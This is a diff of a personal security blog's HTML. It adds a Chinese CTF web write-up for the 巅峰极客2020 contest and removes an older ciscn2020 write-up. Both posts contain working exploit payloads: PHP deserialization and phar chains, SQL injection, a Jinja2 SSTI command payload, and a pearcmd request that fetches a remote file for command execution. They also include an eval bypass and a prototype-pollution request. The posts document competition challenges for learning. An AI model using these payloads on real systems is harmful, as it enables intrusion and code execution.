@@ -66,6 +66,187 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-巅峰极客2020wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/10/20/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/" class="article-date">
+  <time class="dt-published" datetime="2020-10-20T07:51:42.731Z" itemprop="datePublished">2020-10-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/10/20/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/">巅峰极客2020wp</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="巅峰极客2020"><a href="#巅峰极客2020" class="headerlink" title="巅峰极客2020"></a>巅峰极客2020</h1><p><strong>文章首发于<a href="https://www.anquanke.com/post/id/218977" target="_blank" rel="noopener">安全客</a></strong></p>
+<h2 id="babyphp2"><a href="#babyphp2" class="headerlink" title="babyphp2"></a>babyphp2</h2><p>文件包含：<a href="http://eci-2ze5jqyhfniloont8y3x.cloudeci1.ichunqiu.com/index.php?action=../../../../../../../../../../../var/www/html/login" target="_blank" rel="noopener">http://eci-2ze5jqyhfniloont8y3x.cloudeci1.ichunqiu.com/index.php?action=../../../../../../../../../../../var/www/html/login</a><br>登入接口ban掉：</p>
+<pre><code>`,\,@,%,#</code></pre><pre><code>[11:00:52] 200 -   68B  - /index.php
+[11:00:53] 200 -   68B  - /index.php/login/
+[11:01:33] 200 -  583B  - /login.php
+[11:03:57] 403 -  335B  - /server-status
+[11:04:19] 403 -  336B  - /server-status/
+[11:05:21] 200 -  422B  - /upload.php
+[11:05:22] 403 -  329B  - /upload/
+[11:05:41] 301 -  383B  - /upload  -&gt;  http://eci-2ze5jqyhfniloont8y3x.cloudeci1.ichunqiu.com/upload/
+[11:06:20] 200 -    4KB - /www.zip</code></pre><p>构造反序列化链：<code>dbCtrl::__destruct-&gt;User::__toString-&gt;Reader::__set</code></p>
+<pre><code class="php">&lt;?php
+
+Class Reader{
+    public $filename;
+    public $result;
+    public function __construct(){
+
+    }
+
+}
+
+class User
+{
+    public $id;
+    public $age=null;
+    public $nickname=null;
+    public $backup;
+    public function __construct(){
+        $this-&gt;backup=&quot;/flag&quot;;
+        $this-&gt;nickname=new Reader();
+    }
+}
+class dbCtrl
+{
+    public $hostname=&quot;127.0.0.1&quot;;
+    public $dbuser=&quot;p3rh4ps&quot;;
+    public $dbpass=&quot;p3rh4ps&quot;;
+    public $database=&quot;p3rh4ps&quot;;
+    public $name;
+    public $password;
+    public $mysqli;
+    public $token;
+    public function __construct(){
+        $this-&gt;token=new User();
+    }
+}
+
+$a = new dbCtrl();
+@unlink(&quot;phar.phar&quot;);
+$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar,phar伪协议不用phar后缀
+$phar-&gt;startBuffering();
+$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub,只要后面部分为__HALT_COMPILER(); 
+$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+//签名自动计算
+$phar-&gt;stopBuffering();
+</code></pre>
+<p><code>compress.zlib://phar://phar.phar/test.txt绕过限制</code></p>
+<h2 id="babyback"><a href="#babyback" class="headerlink" title="babyback"></a>babyback</h2><p>php:5.6.40</p>
+<p>robots.txt</p>
+<pre><code>User-agent: *
+Disallow: /admin</code></pre><pre><code>[12:31:50] 200 -   38B  - /admin/
+[12:31:50] 200 -   38B  - /admin/?/login
+[12:31:50] 200 -   38B  - /admin/index.php
+[12:31:57] 200 -   48B  - /check.php
+[12:32:13] 200 -   33B  - /robots.txt
+[12:41:07] 200 -   29B  - /admin/.bowerrc
+[12:41:26] 301 -  185B  - /admin/assets  -&gt;  http://eci-2ze91js64coeqpjda9u8.cloudeci1.ichunqiu.com/admin/assets/
+[12:41:28] 200 -    1KB - /admin/bower.json
+[12:41:38] 301 -  185B  - /admin/images  -&gt;  http://eci-2ze91js64coeqpjda9u8.cloudeci1.ichunqiu.com/admin/images/
+[12:41:39] 200 -   38B  - /admin/index.php
+[12:41:57] 200 -  620B  - /admin/package.json</code></pre><p>check.php 过滤了： </p>
+<pre><code>&quot;,&#39;,-,=,;,select</code></pre><pre><code>username=aaaa\&amp;password= /sleep(5)%23bbbb</code></pre><p>存在sql注入</p>
+<pre><code>账号密码
+admin
+uAreRigHt</code></pre><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201020155506.png" alt="image2642"></p>
+<pre><code>EVAL($COMMAND.&quot;=FALSE&quot;);
+过滤：;,&quot;,&#39;, ,|,`,^,\,;,/,*,(,),&amp;,$,#,f,F</code></pre><p>任意文件包含：</p>
+<pre><code>POST /admin/ HTTP/1.1
+Host: eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com/admin/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1600698604,1601088882; UM_distinctid=174b11256cb2fd-030f86f83a6db3-333769-240000-174b11256cd6f1; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1601100971; PHPSESSID=aabua1gfiqc9s8i13u3iqace72; __jsluid_h=89eac162499bc32092c0474accd770c5
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrD05yt5m
+Content-Length: 161
+
+------WebKitFormBoundaryrD05yt5m
+Content-Disposition: form-data; name=&quot;command&quot;
+
+?&gt;&lt;?=include&lt;&lt;&lt;DDDD
+.bowerrc
+DDDD
+?&gt;
+------WebKitFormBoundaryrD05yt5m--
+</code></pre><p>读取flag</p>
+<pre><code>POST /admin/ HTTP/1.1
+Host: eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://eci-2ze3ccxvzrnduzhd4u54.cloudeci1.ichunqiu.com/admin/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1600698604,1601088882; UM_distinctid=174b11256cb2fd-030f86f83a6db3-333769-240000-174b11256cd6f1; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1601100971; PHPSESSID=aabua1gfiqc9s8i13u3iqace72; __jsluid_h=89eac162499bc32092c0474accd770c5
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 89
+
+command=%3f%3e%3c%3f%3dinclude%7e%3c%3c%3cDDDD%0d%0a%D0%99%93%9E%98%0d%0aDDDD%0d%0a%3f%3e</code></pre><h2 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h2><p><code>GET /loged?name=%7B%7B2*2%7D%7D</code><br>存在SSTI<br>模板引擎jinja2</p>
+<pre><code>http://eci-2ze3domag0jprtzax0lx.cloudeci1.ichunqiu.com:8888/loged?name={%%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}{%%20if%20c.__name__==%27_IterationGuard%27%20%}{{%20c.__init__.__globals__[%27__builtins__%27][%27eval%27](%22__import__(%27os%27).popen(%27cat%20/flag%27).read()%22)%20}}{%%20endif%20%}{%%20endfor%20%}
+</code></pre><p>拿flag</p>
+<h2 id="MeowWorld"><a href="#MeowWorld" class="headerlink" title="MeowWorld"></a>MeowWorld</h2><p>任意文件读取</p>
+<p>hint:register_argc_argv</p>
+<pre><code>register_argc_argv    TRUE    
+由于该设置为 TRUE，将总是可以在 CLI SAPI 中访问到 argc（传送给应用程序参数的个数）和 argv（包含有实际参数的数组）。
+
+对于 PHP 4.3.0，在使用 CLI SAPI 时，PHP 变量 $argc 和 $argv 已被注册并且设定了对应的值。而在这之前的版本，这两个变量在 CGI 或者 模块 版本中的建立依赖于将 PHP 的设置选项 register_globals 设为 on。除了版本和 register_globals 设定以外，可以随时通过调用 $_SERVER 或者 $HTTP_SERVER_VARS 来访问它们。例如：$_SERVER[&#39;argv&#39;]</code></pre><p><a href="https://khack40.info/camp-ctf-2015-trolol-web-write-up/" target="_blank" rel="noopener">https://khack40.info/camp-ctf-2015-trolol-web-write-up/</a></p>
+<p>找到一个类似的题目，但是他们是用变量覆盖来执行</p>
+<p>阅读pearcmd的代码发现：<code>if (!isset($_SERVER[&#39;argv&#39;]) &amp;&amp; !isset($argv) &amp;&amp; !isset($HTTP_SERVER_VARS[&#39;argv&#39;]))</code></p>
+<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200926190107.png" alt="image6158"></p>
+<pre><code>http://eci-2zeguuukox00jv0u113l.cloudeci1.ichunqiu.com/?list+install+--installroot+/tmp/+http://ccreater.top:60006/install.php++++++++++++++$&amp;f=pearcmd&amp;</code></pre><p>后面多余部分并不影响我们下载恶意文件</p>
+<p><code>http://eci-2zeguuukox00jv0u113l.cloudeci1.ichunqiu.com/?f=/tmp/tmp/pear/download/install</code></p>
+<p>任意命令执行</p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/10/20/巅峰极客2020wp/">http://blog.ccreater.top/2020/10/20/巅峰极客2020wp/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/10/20/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/" data-id="ckgho5rse0000dovdavvc1eiz" data-title="巅峰极客2020wp" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
     <article id="post-LFI利用php自带的pearcmd.php直接RCE" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/10/20/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/" class="article-date">
@@ -2929,211 +3110,6 @@ print(requests.get(url,params={&quot;foo&quot;:&quot;NEW java.util.Scanner(NEW j
 
 
   
-    <article id="post-ciscn2020预选赛" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/08/21/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/" class="article-date">
-  <time class="dt-published" datetime="2020-08-21T09:50:28.606Z" itemprop="datePublished">2020-08-21</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/08/21/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/">ciscn2020预选赛</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="ciscn-2020-预选赛"><a href="#ciscn-2020-预选赛" class="headerlink" title="ciscn 2020 预选赛"></a>ciscn 2020 预选赛</h1><h2 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h2><p>和wmctf2020的webwebpayload相同</p>
-<pre><code class="php">&lt;?php
-namespace DB{
-    abstract class Cursor  implements \IteratorAggregate {}
-}
-
-
-namespace DB\SQL{
-    class Mapper extends \DB\Cursor{
-        protected
-            $props=[&quot;quotekey&quot;=&gt;&quot;phpinfo&quot;],
-            $adhoc=[-1=&gt;[&quot;expr&quot;=&gt;&quot;&quot;]],
-            $db;
-        function offsetExists($offset){}
-        function offsetGet($offset){}
-        function offsetSet($offset, $value){}
-        function offsetUnset($offset){}
-        function getIterator(){}
-        function __construct($val){
-            $this-&gt;db = $val;
-        }
-    }
-}
-namespace CLI{
-    class Agent {
-        protected
-            $server=&quot;&quot;;
-        public $events;
-        public function __construct(){
-            $this-&gt;events=[&quot;disconnect&quot;=&gt;array(new \DB\SQL\Mapper(new \DB\SQL\Mapper(&quot;&quot;)),&quot;find&quot;)];
-            $this-&gt;server=&amp;$this;
-
-
-        }
-    };
-    class WS{}
-}
-namespace {
-    echo urlencode(serialize(array(new \CLI\WS(),new \CLI\Agent())));
-}</code></pre>
-<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>阅读代码我们发现:<code>if(!pcntl_wifexited($status)){phpinfo();}</code>，及fork的子进程报错就会执行phpinfo，而phpinfo里面通常包含敏感信息，和一些对我们题目有帮助的信息。</p>
-<p>fork子进程执行的代码是：</p>
-<pre><code class="php">if(isset($_GET[&#39;a&#39;])&amp;&amp;is_string($_GET[&#39;a&#39;])&amp;&amp;!preg_match(&quot;/[:\\\\]|exec|pcntl/i&quot;,$_GET[&#39;a&#39;])){
-            call_user_func_array($_GET[&#39;a&#39;],[$_GET[&#39;b&#39;],false,true]);</code></pre>
-<p>而这里调用了非常敏感的call_user_func_array，所以无论是想让子进程报错还是直接执行代码这里都是非常好的选择。因此我们先要写个fuzz脚本：</p>
-<pre><code class="php">&lt;?php
-
-    $payloads=[
-        &quot;ls&quot;,//shell命令执行测试
-        &quot;index.php&quot;,//读取文件测试
-        &quot;asdfasldfjaklsdfjl.php&quot;,//创建文件/文件夹测试
-        &quot;echo 123;&quot;//php命令执行测试
-    ];
-    $str=file_get_contents(&quot;fatalerr.log&quot;);
-    if(!$str){
-        $str=&quot;[]&quot;;
-    }
-    $fatalerror=eval(&quot;return &quot;.$str.&quot;;&quot;);
-    function show_result($func,$r,$v){
-        if($r==NULL){
-        }
-        try{
-            echo &quot;$func($v,false,true) return value:&quot;;
-            var_dump($r);
-            echo &quot;&lt;br /&gt;&quot;;
-        }catch(Exception $e){}
-    }
-
-    function brute_func($a){
-        global $payloads;
-        global $fatalerror;
-
-        foreach($a as $val){
-
-            if(is_array($val)){
-                brute_func($val);
-                continue;
-            }
-
-            if(in_array($val,$fatalerror)){
-                continue;
-            }
-            array_push($fatalerror,$val);
-            file_put_contents(&quot;fatalerr.log&quot;,var_export($fatalerror,TRUE));
-            foreach($payloads as $v){
-                $r=NULL;
-
-                $r=call_user_func_array($val,[$v,false,true]);
-                show_result($val,$r,$v);
-
-            }
-            array_pop($fatalerror);
-
-        }
-    };
-    $arr=get_defined_functions();
-    brute_func($arr);
-?&gt;</code></pre>
-<p>多次执行发现：</p>
-<pre><code class="php">stream_socket_server
-exec
-stream_socket_client</code></pre>
-<p>这三个函数会引起segment_fault 且 exec虽然会引起segment  fault但是仍然执行了代码</p>
-<p>但是这里只需要segment_fault,所以访问<code>?a=stream_socket_server&amp;b=</code>拿到flag</p>
-<h2 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h2><p>注意到有个eval只要绕过限制就可以执行命令了</p>
-<p>很简单利用字符串拼接绕过</p>
-<p><code>{if:+(&#39;base64_deco&#39;.&#39;d&#39;.&#39;e&#39;)(&#39;c3lzdGVt&#39;)(&#39;cat+/flag&#39;)}{end+if}</code></p>
-<h2 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h2><p>队里的师傅做出来的,dbq，我太菜了</p>
-<pre><code class="php">&lt;?php
-class trick{
-    public $trick1;
-    public $trick2;
-}
-
-
-$t = new trick;
-$t-&gt;trick1 = &quot;INF&quot;;
-$t-&gt;trick2 = 1e1111;
-echo serialize($t);
-</code></pre>
-<h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h2><pre><code>λ npm audit
-
-                       === npm audit security report ===
-
-# Run  npm update set-value --depth 1  to resolve 1 vulnerability
-
-  High            Prototype Pollution
-
-  Package         set-value
-
-  Dependency of   set-value
-
-  Path            set-value
-
-  More info       https://npmjs.com/advisories/1012
-
-
-
-found 1 high severity vulnerability in 61 scanned packages
-  run `npm audit fix` to fix 1 of them.</code></pre><p>原型链污染，poc地址：<br><a href="https://snyk.io/vuln/SNYK-JS-SETVALUE-450213" target="_blank" rel="noopener">https://snyk.io/vuln/SNYK-JS-SETVALUE-450213</a></p>
-<ul>
-<li>先访问一次<code>/SpawnPoint</code>，拿个sessionid</li>
-<li>然后访问<code>/Privilege</code>污染原型链（用<code>constructor.prototype</code>或者<code>__proto__</code>均可）</li>
-<li>最后访问<code>/DeveloperControlPanel</code>拿flag</li>
-</ul>
-<pre><code>POST /Privilege HTTP/1.1
-Host: host
-Content-Type: application/x-www-form-urlencoded
-Cookie: session=yoursession
-
-NewAttributeValue=abc&amp;NewAttributeKey=__proto__.password4
-
-POST /DeveloperControlPanel HTTP/1.1
-Host: host
-Content-Type: application/x-www-form-urlencoded
-Cookie: session=yoursession
-
-key=password4&amp;password=abc</code></pre><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/08/21/ciscn2020预选赛/">http://blog.ccreater.top/2020/08/21/ciscn2020预选赛/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/08/21/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/" data-id="cke41ze4i0000p8v0gx483e56" data-title="ciscn2020预选赛" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -3191,6 +3167,10 @@ key=password4&amp;password=abc</code></pre><p><strong>本文作者</strong>：cc
       <ul>
         
           <li>
+            <a href="/2020/10/20/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/">巅峰极客2020wp</a>
+          </li>
+        
+          <li>
             <a href="/2020/10/20/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/">LFI利用php自带的pearcmd.php直接RCE</a>
           </li>
         
@@ -3204,10 +3184,6 @@ key=password4&amp;password=abc</code></pre><p><strong>本文作者</strong>：cc
         
           <li>
             <a href="/2020/10/05/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/">FastJson1.2.24调试记录_复现</a>
-          </li>
-        
-          <li>
-            <a href="/2020/10/04/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/">2020 ciscn 华东南 web</a>
           </li>
         
       </ul>
